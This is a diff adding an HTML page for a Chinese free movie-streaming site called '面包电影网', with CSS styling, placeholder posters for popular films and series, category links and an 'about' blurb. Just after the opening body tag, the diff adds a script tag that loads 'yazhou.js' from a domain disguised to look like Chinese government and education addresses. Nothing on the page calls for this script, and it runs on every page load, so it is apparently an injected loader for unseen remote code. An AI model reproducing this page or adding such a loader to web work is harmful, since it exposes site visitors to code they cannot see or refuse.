@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>面包电影网 - 免费高清电影在线观看 | mianbaodianyingwang-app</title>
+    <meta name="description" content="面包电影网(mianbaodianyingwang-app)提供最新高清电影、电视剧、综艺在线观看。免费资源丰富，播放流畅，快来面包电影网开启你的观影之旅！">
+    <meta name="keywords" content="面包电影网, mianbaodianyingwang-app, 免费电影, 在线观看, 高清影视">
+    <meta name="author" content="面包电影网">
+    <style>
+        /* 基础重置与变量 */
+        :root {
+            --primary: #6c5ce7;
+            --secondary: #fd79a8;
+            --bg-dark: #0f0f1a;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --text-light: #dfe6e9;
+            --text-muted: #b2bec3;
+            --glass-border: rgba(255, 255, 255, 0.15);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(108, 92, 231, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(253, 121, 168, 0.1) 0%, transparent 40%);
+            min-height: 100vh;
+        }
+
+        /* 容器 */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* 玻璃拟态卡片 */
+        .glass-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: var(--shadow);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .glass-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        /* 头部导航 */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            background: rgba(15, 15, 26, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 24px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            font-size: 0.95rem;
+        }
+
+        .nav-links a:hover {
+            color: var(--secondary);
+        }
+
+        /* 主内容区 */
+        main {
+            margin-top: 80px;
+            padding-bottom: 60px;
+        }
+
+        /* Hero 区域 */
+        .hero {
+            text-align: center;
+            padding: 80px 0 60px;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 16px;
+            background: linear-gradient(to right, #fff, var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin: 0 auto 32px;
+        }
+
+        .hero-url {
+            display: inline-block;
+            background: rgba(108, 92, 231, 0.2);
+            border: 1px solid var(--primary);
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-family: 'Courier New', monospace;
+            font-size: 1.1rem;
+            color: var(--secondary);
+            margin-bottom: 32px;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 14px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 4px 20px rgba(108, 92, 231, 0.4);
+        }
+
+        .cta-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 25px rgba(253, 121, 168, 0.5);
+        }
+
+        /* 栏目通用样式 */
+        section {
+            padding: 60px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 40px;
+            position: relative;
+            display: inline-block;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-radius: 2px;
+        }
+
+        /* 电影网格 */
+        .movie-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 24px;
+        }
+
+        .movie-card {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            aspect-ratio: 2/3;
+        }
+
+        .movie-card img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s;
+        }
+
+        .movie-card:hover img {
+            transform: scale(1.08);
+        }
+
+        .movie-info {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+        }
+
+        .movie-info h3 {
+            font-size: 1.1rem;
+            margin-bottom: 4px;
+        }
+
+        .movie-info span {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        /* 分类导航 */
+        .categories {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .category-tag {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            padding: 10px 24px;
+            border-radius: 30px;
+            color: var(--text-light);
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .category-tag:hover {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-color: transparent;
+            transform: translateY(-3px);
+        }
+
+        /* 关于我们 */
+        .about-content {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .about-content p {
+            margin-bottom: 20px;
+            font-size: 1.05rem;
+            color: var(--text-muted);
+        }
+
+        .highlight {
+            color: var(--secondary);
+            font-weight: 600;
+        }
+
+        /* 页脚 */
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            border-top: 1px solid var(--glass-border);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* 移动端自适应 */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .hero p {
+                font-size: 1rem;
+            }
+
+            .hero-url {
+                font-size: 0.9rem;
+                padding: 10px 20px;
+            }
+
+            .section-title {
+                font-size: 1.6rem;
+            }
+
+            .movie-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+                gap: 16px;
+            }
+
+            section {
+                padding: 40px 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero {
+                padding: 60px 0 40px;
+            }
+
+            .hero h1 {
+                font-size: 1.7rem;
+            }
+
+            .movie-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+    <!-- 头部导航 -->
+    <header>
+        <div class="container">
+            <nav>
+                <a href="#" class="logo">面包电影网</a>
+                <ul class="nav-links">
+                    <li><a href="#home">首页</a></li>
+                    <li><a href="#latest">最新电影</a></li>
+                    <li><a href="#hot">热门剧集</a></li>
+                    <li><a href="#categories">分类</a></li>
+                    <li><a href="#about">关于</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- 主内容 -->
+    <main>
+        <!-- 首页Hero -->
+        <section id="home" class="hero container">
+            <h1>欢迎来到面包电影网</h1>
+            <p>海量高清影视资源，免费在线观看，畅享极致视听体验</p>
+            <div class="hero-url">https://mianbaodianyingwang-app</div>
+            <br>
+            <a href="#" class="cta-button">立即观影</a>
+        </section>
+
+        <!-- 最新电影 -->
+        <section id="latest" class="container">
+            <h2 class="section-title">最新电影</h2>
+            <div class="movie-grid">
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%236c5ce7' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E星际穿越%3C/text%3E%3C/svg%3E" alt="星际穿越">
+                    <div class="movie-info">
+                        <h3>星际穿越</h3>
+                        <span>科幻 / 冒险</span>
+                    </div>
+                </a>
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%23fd79a8' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E盗梦空间%3C/text%3E%3C/svg%3E" alt="盗梦空间">
+                    <div class="movie-info">
+                        <h3>盗梦空间</h3>
+                        <span>悬疑 / 动作</span>
+                    </div>
+                </a>
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%2300b894' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E阿凡达%3C/text%3E%3C/svg%3E" alt="阿凡达">
+                    <div class="movie-info">
+                        <h3>阿凡达</h3>
+                        <span>科幻 / 奇幻</span>
+                    </div>
+                </a>
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%23fdcb6c' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E泰坦尼克号%3C/text%3E%3C/svg%3E" alt="泰坦尼克号">
+                    <div class="movie-info">
+                        <h3>泰坦尼克号</h3>
+                        <span>爱情 / 灾难</span>
+                    </div>
+                </a>
+            </div>
+        </section>
+
+        <!-- 热门剧集 -->
+        <section id="hot" class="container">
+            <h2 class="section-title">热门剧集</h2>
+            <div class="movie-grid">
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%23e17055' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E权力的游戏%3C/text%3E%3C/svg%3E" alt="权力的游戏">
+                    <div class="movie-info">
+                        <h3>权力的游戏</h3>
+                        <span>剧情 / 奇幻</span>
+                    </div>
+                </a>
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%2374b9ff' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E绝命毒师%3C/text%3E%3C/svg%3E" alt="绝命毒师">
+                    <div class="movie-info">
+                        <h3>绝命毒师</h3>
+                        <span>犯罪 / 剧情</span>
+                    </div>
+                </a>
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%23a29bfe' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E怪奇物语%3C/text%3E%3C/svg%3E" alt="怪奇物语">
+                    <div class="movie-info">
+                        <h3>怪奇物语</h3>
+                        <span>科幻 / 恐怖</span>
+                    </div>
+                </a>
+                <a href="#" class="movie-card glass-card">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='450' viewBox='0 0 300 450'%3E%3Crect fill='%23fd79a8' width='300' height='450'/%3E%3Ctext fill='white' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3E纸牌屋%3C/text%3E%3C/svg%3E" alt="纸牌屋">
+                    <div class="movie-info">
+                        <h3>纸牌屋</h3>
+                        <span>政治 / 剧情</span>
+                    </div>
+                </a>
+            </div>
+        </section>
+
+        <!-- 分类导航 -->
+        <section id="categories" class="container">
+            <h2 class="section-title">分类导航</h2>
+            <div class="categories">
+                <a href="#" class="category-tag">动作片</a>
+                <a href="#" class="category-tag">喜剧片</a>
+                <a href="#" class="category-tag">爱情片</a>
+                <a href="#" class="category-tag">科幻片</a>
+                <a href="#" class="category-tag">恐怖片</a>
+                <a href="#" class="category-tag">剧情片</a>
+                <a href="#" class="category-tag">动画片</a>
+                <a href="#" class="category-tag">纪录片</a>
+                <a href="#" class="category-tag">国产剧</a>
+                <a href="#" class="category-tag">美剧</a>
+                <a href="#" class="category-tag">韩剧</a>
+                <a href="#" class="category-tag">综艺</a>
+            </div>
+        </section>
+
+        <!-- 关于我们 -->
+        <section id="about" class="container">
+            <h2 class="section-title">关于面包电影网</h2>
+            <div class="about-content glass-card">
+                <p>
+                    <span class="highlight">面包电影网</span>（网址：<span class="highlight">https://mianbaodianyingwang-app</span>）是一个专注于提供高清影视资源的在线观看平台。
+                </p>
+                <p>
+                    我们致力于为用户提供丰富、流畅的观影体验，涵盖电影、电视剧、综艺、动漫等各类优质内容。无论你是喜欢好莱坞大片，还是偏爱独立文艺佳作，面包电影网都能满足你的需求。
+                </p>
+                <p>
+                    每日更新最新资源，免费观看，无需注册。快来面包电影网，发现属于你的精彩影视世界！
+                </p>
+            </div>
+        </section>
+    </main>
+
+    <!-- 页脚 -->
+    <footer>
+        <div class="container">
+            <p>© 2024 <span class="highlight">面包电影网</span> | 网址：https://mianbaodianyingwang-app | 本网站仅用于学习交流</p>
+        </div>
+    </footer>
+
+</body>
+</html>
